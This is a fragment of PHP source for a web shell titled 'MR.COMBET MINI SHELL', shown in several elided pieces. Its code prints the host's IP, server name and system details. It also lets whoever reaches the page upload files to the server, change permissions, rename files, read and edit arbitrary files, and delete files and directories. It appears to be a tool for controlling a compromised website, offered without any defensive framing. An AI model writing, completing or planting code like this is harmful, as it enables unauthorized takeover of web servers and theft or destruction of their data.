...
<a href="?"><h1 style="font-family: Chilanka; font-size: 35px; color: white;">MR.COMBET MINI SHELL</h1></a>
<BODY>

<table width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>';
echo "<tr><td><font color='white'>
<i class='fa fa-user'></i> <td>: <font color='#00bfff'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
<i class='fa fa-desktop'></i> <td>: <font color='#00bfff'>".gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']."<tr><td><font color='white'>
<i class='fa fa-hdd-o'></i> <td>: <font color='#00bfff'>".php_uname()."</font></tr></td></table>";
...
//upload
echo '<br><br><br><font color="#00bfff"><form enctype="multipart/form-data" method="POST">
Upload File: <input type="file" name="file" style="color:#00bfff;border:2px solid #00bfff;" required/></font>
<input type="submit" value="UPLOAD" style="margin-top:4px;width:100px;height:27px;font-family:Chilanka;font-size:15;background:black;color: #00bfff;border:2px solid #00bfff;border-radius:5px"/>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<br><br><font color="#00bfff">UPLOAD SUCCES !!!!</font><br/>';
}else{
...
echo '<br><br><font color="#00bfff">CHANGE PERMISSION SUCCESS !!</font><br/>';
}else{
...
echo '<br><br><font color="#00bfff">CHANGE NAME SUCCESS !!</font><br/>';
}else{
...
echo '<br><br><font color="#00bfff">EDIT FILE SUCCESS !!</font><br/>';
}else{
...
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="font-size: 10px; border: 1px solid white; background-color: black; color: yellow; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="#00bfff">DELETE DIR SUCCESS !!</font><br/>';
}else{
...
echo '<br><br><font color="#00bfff">DELETE FILE SUCCESS !!</font><br/>';
}else{
...
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Chilanka;font-size:15;background:black;color:#00bfff;border:2px solid #00bfff;border-radius:5px\">
...
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Chilanka;font-size:15;background:black;color:#00bfff;border:2px solid #00bfff;border-radius:5px\"/>
</form></center></td>
</tr>";
}
